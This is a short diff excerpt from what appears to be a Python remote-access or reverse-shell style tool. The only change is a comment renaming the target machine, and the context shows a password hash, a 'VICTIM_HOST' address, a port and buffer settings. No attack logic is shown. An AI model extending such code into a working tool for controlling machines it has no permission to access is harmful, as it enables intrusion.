@@ -22,7 +22,7 @@ def hash_password(password):
 # Hash the password
 hashed_password = hash_password(PASSWORD)
 
-VICTIM_HOST = "10.0.2.5"  # Replace with the actual IP address of 'banana'
+VICTIM_HOST = "10.0.2.5"  # Replace with the actual IP address of the victim machine
 VICTIM_PORT = 5003
 BUFFER_SIZE = 1024 * 128
 SEPARATOR = "<sep>"
